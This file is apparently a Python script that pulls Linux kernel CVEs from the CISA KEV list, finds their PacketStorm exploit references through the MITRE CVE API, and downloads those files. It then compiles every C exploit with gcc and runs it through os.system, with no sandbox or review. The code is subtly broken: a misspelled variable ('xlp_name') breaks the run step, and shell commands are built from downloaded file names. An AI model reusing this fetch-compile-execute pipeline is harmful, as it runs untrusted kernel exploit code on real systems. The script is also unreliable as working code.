import os
import json
import httpx

CISA_KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/" \
               "known_exploited_vulnerabilities_schema.json"

CISA_KEV_PATH = "known_exploited_vulnerabilities.json"
CVEORG_BASE_URL = "https://cveawg.mitre.org/api/cve/"
GITHUB_URL = "https://github.com/search?q={}%20&type=repositories"
PACKETSTORM_URL = "https://packetstorm.news/download/" # ...file_id

def main():
    #res = httpx.get(CISA_KEV_URL)
    #print(res.json()[0].keys())
    with open(CISA_KEV_PATH, "r") as f:
        res: list = [json.load(f),]
    
    kern_cve = []
    #print(res[0]['vulnerabilities'][0].keys())
    for vuln in res[0]['vulnerabilities']:
        if vuln['product'] == "Kernel": # 26
            kern_cve.append(vuln) 

    d_urls_list = []
    #for cve in kern_cve: print(cve.values())
    for cve in kern_cve:
        cve_details = httpx.get(CVEORG_BASE_URL + cve["cveID"]).json()
        #print(cve_details["containers"]["cna"]["references"][0]["url"])
        for refc in cve_details["containers"]["cna"]["references"]:
            if "packetstormsecurity.com/files" in refc["url"]:
                print(refc["url"])
                # save to data
                d_url = PACKETSTORM_URL + refc["url"].split("/")[4]
                d_urls_list.append(d_url)
    
    with httpx.Client(cookies={"tos": "20250922"}) as cli:
        # It works until it gets blocked, enough for testing, but it need to be fixed 
        for url in d_urls_list:
            rsp = cli.get(url)
            with open("./data/" + url.split("/")[-1], "wb") as f:
                f.write(rsp.content)
    fix_filename() # gcc cant find

    for xpl_name in [f for f in os.listdir('./data') if f.endswith('.c')]:
        os.system("gcc -o ./xpl/tmp.out ./data/" + str(xlp_name))
        os.system("chmod +x ./xpl/tmp.out; ./xpl/tmp.out")


def fix_filename(directory='./data'):
    for filename in os.listdir(directory):
        if filename.isdigit():
            file_path = os.path.join(directory, filename)
            mime_type = os.popen(
                f'file --mime-type -b "{file_path}"'
            ).read().strip()
            ext = {'text/x-c': '.c', 
                   'text/x-ruby': '.rb', 
                   'text/x-python': '.py'}.get(mime_type)
            if ext:
                os.rename(file_path, f"{file_path}{ext}")


if __name__ == "__main__":
    main()